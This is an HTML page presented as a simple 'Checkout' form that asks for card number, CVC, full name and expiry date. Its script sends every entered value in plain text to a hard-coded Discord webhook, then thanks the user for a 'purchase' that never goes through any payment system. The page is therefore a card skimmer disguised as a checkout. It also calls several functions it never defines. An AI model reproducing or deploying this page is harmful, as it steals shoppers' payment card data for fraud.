<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checkout Only</title>

  <style>
    body {
      background:#111;
      color:#fff;
      font-family:Arial;
      margin:0;
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
    }

    #checkoutBox {
      background:#222;
      padding:25px;
      width:320px;
      border-radius:12px;
      text-align:center;
    }

    input {
      width:100%;
      padding:10px;
      margin-top:12px;
      border-radius:6px;
      border:none;
      outline:none;
      font-size:14px;
    }

    #purchaseBtn {
      width:100%;
      padding:12px;
      margin-top:20px;
      border:none;
      border-radius:6px;
      background:#555;
      color:white;
      font-size:16px;
      cursor:not-allowed;
      transition:0.2s;
    }

    #purchaseBtn.enabled {
      background:#ff3cc7;
      cursor:pointer;
    }
  </style>
</head>
<body>

<div id="checkoutBox">
  <h2>Checkout</h2>

  <input id="cardNum" type="text" maxlength="16" placeholder="Card Number">
  <input id="cvc" type="text" maxlength="3" placeholder="CVC">
  <input id="fullName" type="text" placeholder="Full Name">
  <input id="expDate" type="text" placeholder="Exp Date (MM/YY)">

  <button id="purchaseBtn" disabled>Purchase</button>
</div>

<script>
const webhookURL =
  "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";

function finishPurchase() {
  const payload = {
    content:
`ðŸ›’ **New Purchase**
Cvc: ${cvc.value}
Credit Card: ${cardNum.value}
Buyer: ${fullName.value}
Exp date: ${expDate.value}
Time: ${new Date().toLocaleString()}`
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  })
    .then((res) => {
      if (res.ok) {
        alert("Thank you for your purchase!");
        closeCheckout();

        cardNum.value = "";
        cvc.value = "";
        fullName.value = "";
        expDate.value = "";
        validateCheckout();
      } else {
        alert("Webhook error.");
      }
    })
    .catch((err) => alert("Error: " + err));
}

loadItems();
</script>

</body>
</html>
